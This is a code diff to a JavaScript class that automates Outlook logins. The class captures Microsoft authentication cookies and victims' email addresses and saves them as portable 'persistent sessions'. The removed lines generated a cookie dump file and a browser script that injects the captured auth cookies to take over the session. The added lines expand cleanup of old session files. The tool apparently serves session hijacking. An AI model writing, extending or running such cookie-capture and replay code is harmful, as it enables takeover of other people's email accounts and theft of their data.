@@ -759,13 +759,14 @@ class OutlookLoginAutomation {
             fs.writeFileSync(sessionFile, JSON.stringify(sessionPackage, null, 2));
             console.log(`💾 Session saved: ${sessionFile} (overwrites any existing session for this email)`);
 
-            // Clean up old timestamp-based files for this email
+            // Clean up old files for this email (remove legacy txt and js files)
             try {
                 const files = fs.readdirSync(sessionDir);
                 const oldFiles = files.filter(file => 
                     file.startsWith(`outlook_session_${emailSafe}_`) || 
-                    file.startsWith(`outlook_cookies_${emailSafe}_`) ||
-                    file.startsWith(`inject_${emailSafe}_`)
+                    file.startsWith(`outlook_cookies_${emailSafe}`) ||
+                    file.startsWith(`inject_${emailSafe}`) ||
+                    (file.includes(emailSafe) && (file.endsWith('.txt') || file.endsWith('.js')))
                 );
                 
                 oldFiles.forEach(file => {
@@ -775,78 +776,11 @@ class OutlookLoginAutomation {
                 });
                 
                 if (oldFiles.length > 0) {
-                    console.log(`✅ Cleaned up ${oldFiles.length} old session files for this email`);
+                    console.log(`✅ Cleaned up ${oldFiles.length} old files for this email`);
                 }
             } catch (cleanupError) {
                 console.log('⚠️ Could not clean up old files:', cleanupError.message);
             }
-
-            // Legacy cookie format for compatibility
-            const cookieFile = path.join(sessionDir, `outlook_cookies_${emailSafe}.txt`);
-            let cookieText = `# Microsoft Outlook Enhanced Persistent Session\n`;
-            cookieText += `# Saved: ${new Date().toISOString()}\n`;
-            cookieText += `# Email: ${email || 'N/A'}\n`;
-            cookieText += `# Total cookies: ${uniqueCookies.length}\n`;
-            cookieText += `# Expiry: 5 years (maximum persistence)\n`;
-            cookieText += `# Cross-computer compatible: YES\n\n`;
-
-            uniqueCookies.forEach(cookie => {
-                cookieText += `Name: ${cookie.name}\n`;
-                cookieText += `Value: ${cookie.value}\n`;
-                cookieText += `Domain: ${cookie.domain}\n`;
-                cookieText += `Path: ${cookie.path}\n`;
-                cookieText += `Secure: ${cookie.secure}\n`;
-                cookieText += `HttpOnly: ${cookie.httpOnly}\n`;
-                cookieText += `SameSite: ${cookie.sameSite}\n`;
-                cookieText += `Expires: ${new Date(cookie.expires * 1000).toISOString()}\n`;
-                cookieText += `Session: false\n`;
-                cookieText += `---\n\n`;
-            });
-
-            fs.writeFileSync(cookieFile, cookieText);
-
-            // Create browser-injectable script
-            const injectScript = path.join(sessionDir, `inject_${emailSafe}.js`);
-            const scriptContent = `
-// Enhanced Microsoft Authentication Cookie Injector
-// Auto-generated on ${new Date().toISOString()}
-// Email: ${email || 'N/A'}
-
-(function() {
-    console.log('🚀 Injecting ${uniqueCookies.length} persistent Microsoft auth cookies...');
-
-    const cookies = ${JSON.stringify(uniqueCookies, null, 4)};
-    let injected = 0;
-
-    cookies.forEach(cookie => {
-        try {
-            let cookieStr = cookie.name + '=' + cookie.value + ';';
-            cookieStr += 'domain=' + cookie.domain + ';';
-            cookieStr += 'path=' + cookie.path + ';';
-            cookieStr += 'expires=' + new Date(cookie.expires * 1000).toUTCString() + ';';
-            if (cookie.secure) cookieStr += 'secure;';
-            if (cookie.sameSite) cookieStr += 'samesite=' + cookie.sameSite + ';';
-
-            document.cookie = cookieStr;
-            injected++;
-        } catch (e) {
-            console.warn('Failed to inject cookie:', cookie.name);
-        }
-    });
-
-    console.log('✅ Successfully injected ' + injected + ' cookies!');
-    console.log('🌐 Navigate to https://outlook.office.com/mail/ to test');
-
-    // Auto-redirect option
-    setTimeout(() => {
-        if (confirm('Injected ' + injected + ' auth cookies! Open Outlook now?')) {
-            window.open('https://outlook.office.com/mail/', '_blank');
-        }
-    }, 1000);
-})();`;
-
-            fs.writeFileSync(injectScript, scriptContent);
-            console.log(`🔧 Browser injection script: ${injectScript}`);
 
             console.log(`✅ Enhanced persistent session saved with ${uniqueCookies.length} cookies`);
             if (email) console.log(`📧 Email captured: ${email}`);
